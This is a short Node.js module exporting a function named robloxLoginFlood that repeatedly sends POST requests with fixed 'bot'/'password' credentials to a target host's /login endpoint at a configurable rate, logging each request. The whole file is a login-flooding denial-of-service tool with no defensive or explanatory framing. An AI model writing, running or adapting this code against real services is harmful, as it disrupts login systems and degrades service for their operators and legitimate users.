const request = require('request');

function robloxLoginFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const options = {
            url: `https://${target}/login`,
            method: 'POST',
            json: {
                username: 'bot',
                password: 'password'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                logOutput('Error: ' + error.message);
            } else {
                logOutput('Sent Roblox login request');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = robloxLoginFlood;
